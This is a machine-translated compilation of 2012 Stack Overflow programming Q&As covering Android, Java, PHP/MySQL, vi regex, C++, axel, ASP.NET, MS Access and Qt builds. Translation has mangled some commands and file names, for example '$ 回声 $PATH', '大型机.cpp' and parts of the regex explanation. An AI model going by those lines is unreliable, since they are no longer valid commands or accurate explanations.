根据下面的方法，如果设备不处于飞行模式或在任​​何连接模式下都没有可用的网络，则方法将返回 false，否则返回 true。请记住，如果满足上述情况，它将返回 null。因此，它是通过检查空 netInfo 对象来处理的。

```
public boolean isOnline() {
ConnectivityManager conManager =
    (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
NetworkInfo netInfo = conManager .getActiveNetworkInfo();
if (netInfo != null && netInfo.isConnectedOrConnecting()) {
    return true;
}
return false; 
```

}

请记住获得访问清单的网络状态的权限。

```
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /> 
```

# java - Oracle Java 1.7 破坏了 Xcode 应用程序，如何取消选中？

> ID：13217677
> 
> 赞同：1
> 
> 时间：2012-11-04T10:15:27.470
> 
> 标签：java, xcode, macos

有人在较早的帖子中表示，您可以做两件事来解决此问题：

*卸载 Java 1.7 并回退到 Apple Java 1.6.34 或 35 工作或暂时关闭 Java 1.7。转到：应用程序 > 实用程序 > Java 首选项并取消选中 java 1.7。之后，上传者工作。如果您需要 1.7，您可以在上传后重新打开它。*

我不能使用第一个选项，因为我需要 Java JRE 来完成其他开发任务

那你怎么取消勾选呢？我似乎无法在实用程序下找到 Java 首选项。我在“其他”下的设置选项中有一个 Java 选项，我可以在其中访问 Java 运行时环境设置。在这里，我有一行 Java 1.7 并启用了签入，但我似乎无法取消选中它。希望有人可以提供帮助。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T20:16:36.360

这一直没有解决。Apple 帮助了该项目，并确认他们的验证代码中存在错误。为了提交，我必须使用 IPA 和应用程序加载器。

# php - SHOW TABLES 只显示以空格 mysql 开头的表

> ID：13217679
> 
> 赞同：3
> 
> 时间：2012-11-04T10:15:58.830
> 
> 标签：php, mysql, sql

我有一些代码需要获取数据库中所有表的列表，其中某个列等于某个事物。但是，使用`SHOW TABLES`MySQL 代码只是列出以空格开头的表。这是我的代码...

```
$result = mysql_query("SHOW FULL TABLES IN `db`") or die("Error: " . mysql_error());
while ($word = mysql_fetch_array($result)) {
    $word = $word[0];
    $sql = "SELECT * FROM `db`.`$word` WHERE col='$val'";
    $result = mysql_query($sql, $con) or die("Error: " . mysql_error());
    while ($col = mysql_fetch_array($result)) echo "<li><a nav='$word' title='View $word'>$word</a></li>";
} 
```

出于某种原因，第一个`mysql_query()`只返回一个结果，恰好是一个以空格开头的表。（这是唯一一个以空格开头的表格） 编辑：我刚刚意识到我遗漏了将 $word 从数组转换为字符串的代码行......它现在就在那里。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T10:22:12.757

您在循环中覆盖了 $result （您的表格列表）。

第一次迭代后，$result 将包含第一个表中的字段列表。

# java - 用户界面：Action Bar 和 Contextual Action Bar，新趋势

> ID：13217682
> 
> 赞同：1
> 
> 时间：2012-11-04T10:16:04.013
> 
> 标签：java, android, user-interface, android-actionbar, contextual-action-bar

我正在尝试第一次构建一个 android 应用程序。我可以用英语阅读，但不是很好。首先，我阅读了 android.developer.com。我有一个带有列表视图的活动。我还希望有 2 种类型的菜单： 1 - 通用的，例如带有“帮助”、“自定义”等命令；2 - 对于 1 个或多个选定的列表行“共享”、“删除”等。

我将 1 号菜单作为我的 Activity 上的操作栏。那很好。首先，我想将 2 号菜单作为上下文菜单（长按运行），但在那个站点上，他们说“上下文菜单很旧，请使用上下文操作栏”。好的，我读到了关于 CAB 的信息。据我了解，当用户选择列表中的行时，CAB 将仅显示相同的按钮（右上角有 3 个点），因此用户菜单将完全改变。这很奇怪！好吧，如果我除了那个用户会习惯这种转换之外，如果他选择了 10 个项目并决定看“帮助”怎么办？将没有可用的“帮助”！

我没有安卓设备，我不能只看它在真实程序上的表现。请，如果有人理解我在说什么，请向我解释它应该如何工作？如果可以的话，请给我看一些打印屏幕的例子。

编辑：我的目标是（1）以正确的方式（现代方式）将上下文菜单构建到应用程序中，我的问题是（2）如果我理解正确的用户无法从选择模式访问操作栏菜单（编号 1）。是这样吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T10:46:23.200

您可以构建您的问题并专注于您的目标，否则它将被关闭为不具建设性/离题。但是，让我向您展示一些来自官方 gmail 应用程序的屏幕（它们是加泰罗尼亚语，我只会翻译重要的东西）

**收件箱没有任何选择** ![在此处输入图像描述](../Images/b6430775e541edbdf69dd346a3dd0d6c.png)

**一旦您选择了一封或多封电子邮件。上下操作栏发生变化。（Seleccionat 表示选中）** ![在此处输入图像描述](../Images/52b8a42e57f315df9c5a581d321a3cf0.png)

如您所见，向上和向下操作栏都会更改其操作，以仅显示您可以在编辑模式下使用的操作。

**在横向模式下，只有一个操作栏，处于上下文模式。您可以在那里添加您需要的操作。** ![在此处输入图像描述](../Images/1c2de298d6408c7fb794fa1d22a2accb.png)

更多信息：http: [//developer.android.com/guide/topics/ui/menus.html#CAB](http://developer.android.com/guide/topics/ui/menus.html#CAB)

**编辑**：如上图所述，您可以在选择模式下定义自己的操作栏，并根据需要添加许多功能。见第二张图。在邮件列表下方，您可以执行许多操作。它们与普通模式不同，但当然您可以在 CAB 中添加常规操作。只要确保它们在编辑模式中都有意义。

# java - Java MVC - 添加 MouseListener 的问题

> ID：13217684
> 
> 赞同：4
> 
> 时间：2012-11-04T10:16:57.753
> 
> 标签：java, swing, model-view-controller, listener, mouselistener

我是一名 Java 学生，刚刚结束了一个小命令行纸牌游戏的基本功能。游戏是魔法类集换式卡牌游戏的简化版。没有人工智能，你与自己或其他人类玩家对战。

此时，我正在尝试使用 MVC 向它添加一些 GUI，但**我发现将 MouseListener 添加到按钮时遇到问题**。

这是对正在发生的事情的简要说明：

*   我有一个`Model`类，它`Observable`通过继承超类来扩展
*   一个`View`实现`Observer`.
*   还有一个`Controller`扩展的类`MouseAdapter`

然后我把所有东西放在一起：

```
....

View view = new View();
Model model = new Model();

model.addObserver( view );

Controller controller = new Controller();
// associate Controller's Model and View objects
controller.addModel(model);
controller.addView(view);

view.addController(controller); // i try to add the MouseListener

.... 
```

View 的 addController() 方法是：

```
public void addController(Controller controller){
            this.myButton.addMouseListener( controller )
} 
```

我已经检查过`addController()`正在调用该方法（其中包含 println 内容），但由于某种原因未设置侦听器：`mouseReleased()`单击按钮时从未调用过。

我可能忽略了任何想法或任何步骤？欣赏。

**编辑（控制器代码）：**

```
public class Controller extends MouseAdapter {

    Model model;
    View view;

    public void addModel(Model m){
            this.model = m;
    }

    public void addView(View ui){
            this.view = ui;
    }

    // All @Overrides

    @Override
    public void mouseReleased(MouseEvent me) {
        System.out.println("oh, it arrived");
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T10:47:19.027

你一定是做错了什么，但没有代码我不能说什么。这是一些有效的简单代码（也许它可以帮助您了解您做错了什么）：

```
 import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.SwingUtilities;

public class Test1 extends JFrame {

    public Test1() {
        initUI();
    }

    private void initUI() {
        JPanel container = new JPanel();
        container.setLayout(new BorderLayout());
        container.setBackground(Color.black);

        JButton b = new JButton("test");
        b.addMouseListener(new Controller());
        container.add(b);

        add(container);
        pack();

    }

    public static void main(String args[]) {
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                Test1 c = new Test1();
                c.setVisible(true);
            }
        });
    }

    class Controller extends MouseAdapter {
        @Override
        public void mouseReleased(MouseEvent me) {
            System.out.println("oh, it arrived");
        }
    }

} 
```

# html - How to discover Unique Device IDs in Bluetooth network with Web APIs?

> ID：13217685
> 
> 赞同：1
> 
> 时间：2012-11-04T10:17:03.120
> 
> 标签：html, bluetooth, network-protocols

How to discover Unique Device IDs in Bluetooth network with Web APIs, **not with native Java APIs**? Any working example?

WebKit still has not implemented this APIs:

*   Discovery API [https://bugs.webkit.org/show_bug.cgi?id=101162](https://bugs.webkit.org/show_bug.cgi?id=101162)
*   Bluetooth API [https://bugs.webkit.org/show_bug.cgi?id=101034](https://bugs.webkit.org/show_bug.cgi?id=101034)

and Mozilla are implementing for B2G [https://wiki.mozilla.org/WebAPI](https://wiki.mozilla.org/WebAPI), issues [https://bugzilla.mozilla.org/show_bug.cgi?id=727618](https://bugzilla.mozilla.org/show_bug.cgi?id=727618), [https://bugzilla.mozilla.org/show_bug.cgi?id=674737](https://bugzilla.mozilla.org/show_bug.cgi?id=674737)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T17:22:12.350

虽然不是最终 API Chrome 在 Linux 和 ChromeOS 中支持蓝牙[http://developer.chrome.com/apps/bluetooth.html#method-getDevices](http://developer.chrome.com/apps/bluetooth.html#method-getDevices)

# java - Changing the value of a previously declared variable that is also an element of an Array?

> ID：13217686
> 
> 赞同：0
> 
> 时间：2012-11-04T10:17:11.997
> 
> 标签：java

so I have tried searching for the answer to this question, but really don't know exactly how to find my answer. I am trying to insert values into an array, whose elements i declared previously in the same class. It does not work as far as I can tell. The element will change, but not the original variable the element represents. Is this because they are not the same variable (the array makes a copy or something? I hope this makes sense, but if not here is some sample code:

```
public class bucky {
public static void main(String args[]) {

    tuna tunaObject = new tuna();
    tunaObject.assignArray(25);
}
} 
```

.

```
public class tuna {
int day;
int month;
int year;

int dateArray[] = {day, month, year};

void assignArray(int dayInput){
    dateArray[0] = dayInput;
    System.out.println(dateArray[0]);
    System.out.println(day);
 }
} 
```

The output is: 25 0

So clearly day does not get altered. Though I wish it would, and wonder how I can make this work.

Unfortunately it's late. I've been working at this for hours. I'm tired. And I'm pretty sure the clocks just rolled back an hour on me.... Knowing the answer to why this doesn't work would make it all worth while. Cheers!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:23:04.817

`int`是一个[值类型](http://msdn.microsoft.com/en-us/library/s1ax56ch.aspx)，而不是[引用类型](http://msdn.microsoft.com/en-us/library/490f96s2.aspx)，所以`day`and`dateArray`不存储对值的引用，而是存储实际值。

如果您还想将新值分配给`day`，则必须明确执行此操作：

```
void assignArray(int dayInput){
    dateArray[0] = dayInput;
    day = dayInput;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T10:32:23.763

您显然是 Java 新手（从您不使用 Java 约定我可以看出），并且您应该知道对于您的这种特殊情况，这种指针的东西不会在 Java 中发生。

原始类型（在您的情况下为整数）不是通过引用传递的，而是通过值传递的。

您的问题的解决方案是添加另一行

```
day = dateInput
dateArray[0] = day 
```

每次更新一天的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T10:23:25.693

创建 dateArray 时，您会通过复制日期、月份和年份的值来影响值。那些不是参考。所以不要期望通过修改数组值来改变你的属性。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-04T10:19:40.623

`day`是 class 的实例变量`Tuna`，并且您的数组是 int 类型，它仅在其第一个索引处使用 date （一个 int 变量）。因此，您的 dateArray 只是在其第一个索引处使用 day 的值。

```
 int day=12;

    int dateArray[] = {day}; 
```

现在 dateArray 的第一个索引值为 12。

# objective-c - Get IndexPath from a UITableViewCell's subview

> ID：13217689
> 
> 赞同：0
> 
> 时间：2012-11-04T10:18:00.170
> 
> 标签：objective-c, ios, cocoa-touch, uitableview

> **Possible Duplicate:**
> [Detecting which UIButton was pressed in a UITableView](https://stackoverflow.com/questions/1802707/detecting-which-uibutton-was-pressed-in-a-uitableview)

here is my situation, I add a `UITapGestureRecognizer` to a subview of my custom `UITableViewCell`, I set recognizer's target to my tableviewcontroller, so I want to know how can I get this cell's indexPath from my tableviewcontroller's action method.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:27:05.467

```
- (IBAction)recognizerAction:(id)sender {
    UITapGestureRecognizer *recognizer = sender;

    if (recognizer.state == UIGestureRecognizerStateRecognized) {
        YourCell *cell = (YourCell *)recognizer.view;
        NSIndexPath *indexPath = [yourTableView indexPathForCell:cell];
        [self doSomethingWithIndexPath:indexPath];
    }
} 
```

# c - Is there no fopencookie or fmemopen in MinGW?

> ID：13217690
> 
> 赞同：2
> 
> 时间：2012-11-04T10:18:03.383
> 
> 标签：c, windows, stream, mingw

What can I use instead to write custom streams?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T12:37:18.937

`fmemopen`是 POSIX 但不是 C 标准的一部分。`fopencookie`不属于任何标准；这是一个 GNU 函数。

`tmpfile`是一个很好的便携式替代品`fmemopen`。这些功能几乎相同，只是`tmpfile`速度较慢并且需要`fread`取回数据。

通常，如果您可能需要将输出发送到文件以外的其他位置，最好不要编写采用 a`FILE *`而是支持自定义输出回调或其他东西的代码。

# regex - Vi 正则表达式 - 列编辑

> ID：13217697
> 
> 赞同：0
> 
> 时间：2012-11-04T10:19:10.577
> 
> 标签：regex, vi, delimiter

我在 vi 编辑器中打开了一个包含 9 列的文本，我喜欢用逗号替换第 9 列（最后一个）中的制表符，后跟一个空格。到目前为止，我想出了这个；

```
'2,$s#\(^.\{8\}\)\\t#\1\(\,\)#' 
```

但这似乎不匹配任何东西......可能是我逃避了太多东西，但我也不知道您是否需要指定列分隔符（在这种情况下也是一个制表符）。对此的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:24:32.863

```
%s/^\(\%(\t\?[^\t]\+\)\{8\}\)\t\(.*\)$/\1, \2/ 
```

这将替换 ( `s`)：

*   `^`- 线的开始
*   `\(`开始**（第 1 组）**
    *   `\%(`内部组的开始
        *   `\t?`0 或多个s（以说明在行`Tab`首缺少 a ）`Tab`
        *   `[^\t]\+`后跟 1 个或多个`Tab`非
    *   `\)`内组结束
    *   `\{8\}`上述内组重复8次
*   `\)`结束**（第 1 组）**
*   `\t`其次是`Tab`
*   `\(.*\)`以及其他**（第 2 组）**
*   `$`直到行尾

和：

*   `\1`- **（第 1 组）**（直到 8号`Tab`）
*   `, `- 逗号和空格
*   `\2`- **（第 2 组）**（从第 8`Tab`行到行尾的所有内容）

在整个缓冲区 ( `%`)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T11:46:37.680

如果这是一次性替换，您可以改用宏（从您希望更改的第一行的第一个字符开始）：

`q``q``f``Tab``7``;``c``l``,``Space``Esc``j``0``q`

其中按键如下：

*   `q``q`*– 开始在寄存器q*中录制宏
**   `f``Tab`– 找到第一个制表符（即在第 1 列和第 2 列之间）*   `7``;`– 重复此查找七次（即到第 8 列和第 9 列之间的制表符）*   `c``l``,``Space``Esc`– 将制表符更改为逗号和空格*   `j`– 下一行*   `0`– 转到此行的开头*   `q`- 停止录制宏*

 *然后使用`@``q`播放下一行（或`9``9``@``q`播放接下来的 99 行等）。*

# c++ - C++ 包括使用 wxWidgets 和 Opengl 的依赖项

> ID：13217698
> 
> 赞同：0
> 
> 时间：2012-11-04T10:19:15.410
> 
> 标签：c++, opengl, wxwidgets

我不太确定这是否应该被视为 C++ 问题或 wxWidgets：

我正在开发一个相当简单的 wxWidgets 界面，它允许用户绘制三角形。因此，我有一个画布（OpenGLCanvas 类）和一个 wxWindow（CMainFrame 类），问题是我希望我的画布有一个窗口实例，反之亦然。错误的根源是，当编译器到达我的 CMainFrame 实例所在的 OpenGLCanvas 部分时，它（CMainFrame）尚未定义，如果我在这里更改#includes 的顺序，也会发生同样的事情我的代码：

OpenGLCanvas.cpp：

```
#include "mainframe.h"
#include "openglcanvas.h"

...

OpenGLCanvas::OpenGLCanvas(wxWindow *parent, wxWindowID id,const wxPoint& pos, const         wxSize& size,long style, const wxString& name):
                    wxGLCanvas(parent, id, pos, size, style, name)
{
frame = (CMainFrame) parent;
} 
```

openGLCanvas.h：

```
#ifndef __OPENGLCANVAS_H__
#define __OPENGLCANVAS_H__

#include "wx/wx.h"
#include <wx/glcanvas.h>

class OpenGLCanvas: public wxGLCanvas {

public:
CMainFrame* frame;
...
#endif 
```

大型机.cpp：

```
#include "openglcanvas.h"
#include "mainframe.h"

...

CMainFrame::CMainFrame(wxMenuBar* menu, const wxString& title, const wxPoint& pos, const wxSize& size)
: wxFrame((wxFrame *)NULL, -1, title, pos, size) 
{   
m_menu=menu;

canvas = new OpenGLCanvas((wxWindow*)this,-1, pos , size, 0 , wxT("Canvas"));
}//constructor

... 
```

大型机.h

```
#ifndef __MAINFRAME_H__
#define __MAINFRAME_H__

...

class CMainFrame: public wxFrame {

public:
CMainFrame(wxMenuBar* menu,const wxString& title, const wxPoint& pos, const wxSize& size); 
```

我应该如何包含这些文件？（我对 C++ 相当陌生，但对 C 不熟悉）对于我的问题的长度，我深表歉意。任何想法都会有很大帮助。

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T10:26:12.320

由于您只持有一个不需要的指针，因此不建议您包含整个文件。

你只需要一个[前向声明](http://en.wikipedia.org/wiki/Forward_declaration)“class CMainFrame”；

# download - 不要使用 axel 下载现有文件

> ID：13217700
> 
> 赞同：6
> 
> 时间：2012-11-04T10:19:28.640
> 
> 标签：download, resume-download

我有一个脚本可以读取一些 url 并将它们带到 axel 以下载它们。我有时想停止脚本并进一步恢复它。Axel 可以恢复文件下载。因此，如果我在下载时按 Ctrl+C，下一次将从文件的简历开始。

但 axel 不检查文件是否存在。所以它将“.0”附加到文件名的末尾并开始下载它两次。如果存在同名文件，我如何告诉 axel，跳过它而不下载它？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-07T15:05:28.880

如果您想确保 axel 将恢复，就像它按文件名而不是按 url 一样，您应该为文件使用确定性名称：

```
axel -o NAME_OF_EXISTING_FILE 
```

如果要检查文件是否存在

```
if [ -f $FILE ]; then
   echo "File $FILE exists."
    # operation related to when file exists, aka skip download
else
   echo "File $FILE does not exist." 
   # operation related to when file does not exists
fi 
```

在 axel 的情况下，如果1\. 您在本地没有该文件，或者
2\. 您有部分下载，则您想开始下载，所以：

```
function custom_axel() {
    local file_thingy="$1"
    local url="$2"
    if [ ! -e "$file_thingy" ]; then
        echo "file not found, downloading: $file_thingy"
        axel -avn8 "$url" -o "$file_thingy"
    elif [ -e "${file_thingy}.st" ]; then
        echo "found partial downloaf, resuming: $file_thingy"
        axel -avn8  "$url" -o "$file_thingy"
    else
        echo "alteady have the file, skipped: $file_thingy"
    fi
} 
```

这可以进入 ~/.bashrc 或进入 /usr/bin/custom_axel.sh 及更高版本：

```
while read URL; do
    name=$(basename "$URL") # but make sure it's valid.
    custom_axel "$name" "$URL"
done < /my/list/of/files.txt 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-03-18T16:23:41.977

Axel 使用状态文件，以 .st 扩展名命名。
它会在下载过程中定期更新。
当 axel 启动时，它首先检查 <file> 和 <file.st>。如果找到，则从停止的地方继续下载。
你有哪个版本？我得到了 Axel 2.4 版（Linux），它在 CTRL+C 后正确恢复。

# c# - 触发 Application_End 事件的场景有哪些？

> ID：13217704
> 
> 赞同：13
> 
> 时间：2012-11-04T10:19:48.160
> 
> 标签：c#, asp.net, .net, vb.net, events

Asp.net 有一个`Application_End`在应用程序结束时发生的事件，像这样

```
void Application_End(object sender, EventArgs e)
{
} 
```

我的问题是：这个事件是什么时候真正发生的，即什么样的情况会触发它？

假设我有一个正在运行的银行 Web 应用程序`24x7x365`，它连续执行并一次从数千个地方访问，那么这个`Application_End`事件什么时候会发生？什么样的情况是造成这种情况的原因？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-04T10:30:35.440

`Application_End`当回收 IIS 池或更改 bin 文件夹或 web.config 文件时，将触发该事件。您应该更改默认的 IIS 设置以在非高峰时间安排**每天一次回收。**

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-11-04T10:26:20.480

**它将在以下其中一种情况下被解雇：**

1.  IIS 池已重新启动。

2.  Web.config 更改。

3.  应用程序重新启动。

# sql - 如何使用 SQL 删除所有表上的所有记录（1 次）

> ID：13217716
> 
> 赞同：1
> 
> 时间：2012-11-04T10:21:29.013
> 
> 标签：sql, ms-access, sql-delete

我在 ms-access 的 1 个文件中有 14 个表。

我想一次性删除这些表上的所有记录。

我尝试

```
DELETE FROM table1
DELETE FROM table2
DELETE FROM table3
...
DELETE FROM table12
DELETE FROM table13
DELETE FROM table14 
```

并运行它。

但它无法运行。

怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T10:31:50.940

在 MS Access SQL 中一次只能运行一条语句，但是，您可以使用 MS Access VBA：

```
Sub DeleteTables()
    CurrentDB.Execute "DELETE FROM Table1", dbFailOnerror
    CurrentDB.Execute "DELETE FROM Table12", dbFailOnerror
End Sub 
```

或更好

```
astables = Split("table1,table2,table3", ",")

For Each tbl In astables
    CurrentDb.Execute "DELETE FROM " & tbl, dbFailOnError
Next 
```

如果任何表与其他表有关系，则必须确保按特定顺序删除。

如果要从所有表中删除并且顺序无关紧要，可以使用 TableDefs 集合，注意不要从系统表中删除。这是一个非常危险的选择：

```
For Each tdf In CurrentDb.TableDefs
    If Left(tdf.Name, 4) <> "Msys" And Left(tdf.Name, 1) <> "~" Then
        CurrentDb.Execute "DELETE FROM " & tdf.Name, dbFailOnError
    End If
Next 
```

# c - 可以在 C 中使用单个套接字进行全双工通信吗？

> ID：13217726
> 
> 赞同：6
> 
> 时间：2012-11-04T10:23:03.647
> 
> 标签：c, sockets

我正在编写一个点对点应用程序，其中两个客户端对等点之间的连接必须是双工的，以便两个客户端能够同时发送和接收。是否可以使用单个插座或我需要使用两个插座？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-04T10:29:00.243

这是可能的; 我知道的每个操作系统上的套接字都是全双工的——你可以同时发送和接收。然而，要实现真正的全双工通信，您必须确保您的应用程序可以在等待接收时进行传输——这意味着要么使用非阻塞 IO 和事件轮询（在 Linux 上有`select`and `epoll`，或者在 Windows 上类似`WSAAsyncSelect`或重叠 IO）或使用用于发送和接收的不同线程。

# objective-c - RestKit 中的请求问题

> ID：13217730
> 
> 赞同：0
> 
> 时间：2012-11-04T10:23:27.487
> 
> 标签：objective-c, ios, rest, ios4, restkit

我是 restkit 和 iphone 开发的新手，我有一个与在 restkit 中发送请求有关的问题。

我有一个服务器端应用程序在我的服务器上运行，使用真实 IP（比如说 ABCD）和我的应用程序监听端口 8001。现在我想通过 resktik 从我的 ios 应用程序向 ABCD:8001 发送一个请求，我的移动应用程序代码如下所示：

在我的 appdelegate 中，我有：

[RKClient clientWithBaseURLString:@"ABCD"];

在我的视图控制器中，我有：

const bool isNetAvailable = [[RKClient sharedClient] isNetworkReachable];

```
if (!isNetAvailable)

{
    NSLog(@"Network is not available");
    return;
}
else
{
    NSLog(@"Network is available");
}

[[RKClient sharedClient] get:@"/contacts" delegate:self]; 
```

因此，当我仅使用 ABCD 初始化 RKClient 时，看起来一切都可以访问，但发送请求失败，因为我无法将请求发送到 8001 端口，get:@"/contacts" 看起来正确，但请求不会发送到 8001，在 RKCLient 初始化失败期间将 8001 添加到 IP 地址。

你能帮我理解我应该如何在 RestKit 中向 IP:Port 发送请求吗？有没有可能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T14:23:00.977

伙计们，我发现了问题。

我需要使用：

[RKClient clientWithBaseURLString:@"http://ABCD:port"];

代替：

[RKClient clientWithBaseURLString:@"ABCD"];

http:// 一直是必需的 :)

# windows - 无法在 Windows 中从源代码构建 Qt，安装了 Perl 但仍然找不到标头

> ID：13217734
> 
> 赞同：1
> 
> 时间：2012-11-04T10:24:28.653
> 
> 标签：windows, qt, build, cygwin, configure

我在 Windows 7 64 位上使用 Cygwin。我下载了4.8.3。source 并按照[此处](http://qt-project.org/doc/qt-4.8/install-win.html)的说明进行操作，将`<qtdir>/bin`PATH 与我选择的编译器的路径一起放入。配置立即失败，

> $ ./配置
> 
> 创建 qmake。请稍候... g++ -c -o makefile.o -pipe -DQMAKE_OPENSOURCE_EDITION -g -I。-Igenerators -Igenerators/unix -Igenerators/win32 -Igenerators/mac -Igenerators/symbian -Igenerators/integrity -I/cygdrive/c/Qt/4.8.3/include -I/cygdrive/c/Qt/4.8.3/include /QtCore -I/cygdrive/c/Qt/4.8.3/src/corelib/global -I/cygdrive/c/Qt/4.8.3/src/corelib/xml -I/cygdrive/c/Qt/4.8.3 /tools/shared -DQT_NO_PCRE -DQT_BUILD_QMAKE -DQT_BOOTSTRAPPED -DQLIBRARYINFO_EPOCROOT -DQT_NO_TEXTCODEC -DQT_NO_UNICODETABLES -DQT_NO_COMPONENT -DQT_NO_STL -DQT_NO_COMPRESS -I/cygdrive/c/Qt/4.8.3/mkspecs/cygwin-g++ -DHAVE_QCONFIG_CPP -DQT_NO_THREAD -DQT_NO_QOBJECT -DQT_NO_GEOM_VARIANT -DQT_NO_DEPRECATED生成器/makefile.cpp
> 
> 在来自 ./option.h:45:0 的文件中，来自 generators/makefile.h:45，来自 generators/makefile.cpp:42: ./project.h:45:25：致命错误：qstringlist.h：否此类文件或目录编译终止。制作：*** [makefile.o] 错误 1

[此处](http://qt-project.org/forums/viewthread/5360)和[此处](https://stackoverflow.com/questions/2084766/how-to-build-latest-qt-from-git-repository-on-windows)的讨论确定问题出在 Perl 上；但是 Perl 在我的系统和路径上。为了确保我去下载/安装了 ActivePerl，然后我添加`Perl64/bin`到路径中。结果相同。非常感谢一些帮助。

**编辑**，为了完整起见：

> $ whereis perl
> 
> perl: /bin/perl.exe /usr/bin/perl.exe /usr/share/perl /cygdrive/c/Perl64/bin/perl.exe /cygdrive/c/Perl64/bin/perl516.dll
> 
> $ 回声 $PATH
> 
> /cygdrive/c/Perl64/bin:/cygdrive/c/gcc/bin:/bin: ... /cygdrive/c/Qt/4.8.3/bin

**编辑**：失败的行是：

```
#include <qstringlist.h> 
```

如果我用绝对路径替换，这个特定的错误就会消失。（当然，随之而来的还有许多其他错误。）

> $whereis qstringlist.h
> 
> qstringlist：/cygdrive/c/Qt/4.8.3/include/QtCore/qstringlist.h

它明确`-I`包含在 g++ 命令和 FWIW 中

> ```
> $echo $PATH
> 
> ... /cygdrive/c/Qt/4.8.3/include/QtCore 
> ```

**编辑：**添加`-I/cygdrive/c/Qt/4.8.3/include/QtCore`作为显式选项`./configure`什么都不做。说真的，这里发生了什么……

**更新**：这个问题现在实际上值得 250 代表，见[这里](https://stackoverflow.com/questions/13277856/how-to-build-gsl-with-msvc2010)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T12:20:12.693

请查看[受支持的平台](http://qt-project.org/doc/qt-4.8/supported-platforms.html)，那里有关于受支持编译器的说明，可以为您提供有关问题的提示。

据我所知，在最近的 Windows 中你需要 MSVC，而我没有看到任何关于 cygwin 的信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-14T12:18:27.720

您使用的确切配置行是什么？尝试这个：

```
./configure -I/cygdrive/c/Qt/4.8.3/include/ 
```

如果它还在抱怨找不到标头，那确实很奇怪。您可以尝试的另一个选择是：

```
INCLUDE_PATH=/cygdrive/c/Qt/4.8.3/include/ ./configure 
```

# java - 我可以通过 BufferedImage 读取 InputStream 吗？

> ID：13217739
> 
> 赞同：0
> 
> 时间：2012-11-04T10:25:05.343
> 
> 标签：java, image, inputstream, bufferedimage, javax.imageio

```
InputStream bais = new ByteArrayInputStream(b);
BufferedImage bImageFromConvert = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
Graphics g = bImageFromConvert.createGraphics();
g = cvrimg.getGraphics();
g.drawImage(bImageFromConvert, width, height, null);
ImageIO.write(bImageFromConvert, "png", new File("D:\\new.png")); 
```

我收到以下异常： `java.lang.IllegalArgumentException: im == null!`

我应该怎么办 ？

**这是示例代码：**

```
BufferedImage cvrimg = ImageIO.read(file);
int height = cvrimg.getHeight();
int width = cvrimg.getWidth();
ByteArrayOutputStream baos = new ByteArrayOutputStream();
ImageIO.write(new_img, "jpg", baos);
baos.flush();
byte[] imageInByte = baos.toByteArray();
byte[] b = new byte[imageInByte.length];
b[i] = fromUnsignedInt(b2);
InputStream bais = new ByteArrayInputStream(b);
BufferedImage bImageFromConvert = new BufferedImage(width,height,BufferedImage.TYPE_INT_RGB);

// int inBytes = bais.available();

Graphics g = bImageFromConvert.createGraphics();
g = cvrimg.getGraphics();
g.drawImage(bImageFromConvert, width, height, null);
bImageFromConvert=ImageIO.read(bais);
ImageIO.write(bImageFromConvert, "png", new File("D:\\new.png")); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:44:27.707

由于您没有读取输入流，因此您遇到了异常。利用

```
BufferedImage im = ImageIO.read(bais); 
```

来自您的代码的简单转换器，用于读取`jpg`文件并写入`png`文件。

```
BufferedImage cvrimg = ImageIO.read(new File("/path/to/images/old.jpg"));
int height = cvrimg.getHeight();
int width = cvrimg.getWidth();
BufferedImage bImageFromConvert = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
Graphics2D g = bImageFromConvert.createGraphics();
g.drawRenderedImage(cvrimg, null);
ImageIO.write(bImageFromConvert, "png", new File("/path/to/images/new.png")); 
```

# ios - 如何在每隔几个 TableView 单元格之间添加条形图

> ID：13217750
> 
> 赞同：0
> 
> 时间：2012-11-04T10:26:28.280
> 
> 标签：ios, uitableview

我想创建一个看起来像这样的 tableView。（嗯，有不同的标题；））

![在此处输入图像描述](../Images/efe2d69b16ed5d54ca17fc8334901793.png)

到目前为止，我在一些应用程序中看到了这些，但我不知道如何制作这些。由于色调（如导航栏中）和各种应用程序中的相似外观，我猜这些不是自定义单元格而是不同的东西。

还有一个问题（如果它们是自定义单元格）。当我在故事板表格视图中更改原型单元格的单元格高度/背景时，它不会显示在应用程序中，直到我为其创建一个额外的 customcell 类。我错过了什么？

```
if (indexPath.row == 0 || indexPath.row == 7)
{
    static NSString *CellIdentifier = @"TitleCell";
